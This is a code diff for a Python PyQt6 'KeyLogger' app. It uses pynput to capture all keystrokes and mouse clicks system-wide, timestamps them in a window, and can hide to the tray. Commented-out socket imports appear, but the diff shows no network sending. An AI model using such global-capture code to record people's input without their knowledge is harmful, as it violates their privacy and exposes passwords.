@@ -14,12 +14,11 @@
 
 # import socket
 # from threading import Thread
-# from time import sleep
+import datetime
 # import pickle
 # import os
 from pynput import keyboard, mouse
 
-# import PyQt6
 from PyQt6 import QtWidgets
 from PyQt6.QtWidgets import QApplication,\
                             QMainWindow,\
@@ -35,7 +34,9 @@ from ui.raw.ui_keylogger import Ui_KeyLogger
 
 
 class ButtonManager(QThread):
-    clicked = pyqtSignal(str)
+    keyboard_clicked = pyqtSignal(str)
+    mouse_clicked = pyqtSignal(int, int, str)
+    mouse_released = pyqtSignal(int, int, str)
 
     def __init__(self):
         super(ButtonManager, self).__init__()
@@ -47,15 +48,16 @@ class ButtonManager(QThread):
         self._mouseListener.start()
 
     def _keyboard_click(self, key):
-        print("Key pressed: {0}".format(key))
-        self.clicked.emit(str(key))
+        try:
+            self.keyboard_clicked.emit(str(key.name))
+        except AttributeError:
+            self.keyboard_clicked.emit(str(key))
 
     def _mouse_click(self, x, y, button, pressed):
         if pressed:
-            print('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
-            self.clicked.emit(str(button))
+            self.mouse_clicked.emit(x, y, str(button))
         else:
-            print('Mouse released at ({0}, {1}) with {2}'.format(x, y, button))
+            self.mouse_released.emit(x, y, str(button))
 
 
 class KeyLogger(QMainWindow, Ui_KeyLogger):
@@ -77,7 +79,9 @@ class KeyLogger(QMainWindow, Ui_KeyLogger):
 
         self.button_manager = ButtonManager()
         self.button_manager.start()
-        self.button_manager.clicked.connect(self.displayer)
+        self.button_manager.keyboard_clicked.connect(self.keyboard_Clicked)
+        self.button_manager.mouse_clicked.connect(self.mouse_Clicked)
+        self.button_manager.mouse_released.connect(self.mouse_Released)
 
     def tray_Show(self):
         self.tray_icon.hide()
@@ -87,17 +91,11 @@ class KeyLogger(QMainWindow, Ui_KeyLogger):
         self.tray_icon.show()
         self.hide()
 
-    def displayer(self, button: str):
-        self.textBrowser.append(button)
+    def keyboard_Clicked(self, key: str):
+        self.textBrowser.append(f'{datetime.datetime.now()} Key pressed: {key}')
 
-    # def keyPressEvent(self, event: QKeyEvent):
-    #     for item in Qt.Key:
-    #         if event.key() == item:
-    #             self.textBrowser.append(str(item.name))
-    #             break
-    #
-    # def mousePressEvent(self, event: QMouseEvent):
-    #     for item in Qt.MouseButton:
-    #         if event.button() == item:
-    #             self.textBrowser.append(str(item.name))
-    #             break
+    def mouse_Clicked(self, x: int, y: int, button: str):
+        self.textBrowser.append(f'{datetime.datetime.now()} Mouse clicked at ({x}, {y}) with {button}')
+
+    def mouse_Released(self, x: int, y: int, button: str):
+        self.textBrowser.append(f'{datetime.datetime.now()} Mouse released at ({x}, {y}) with {button}')
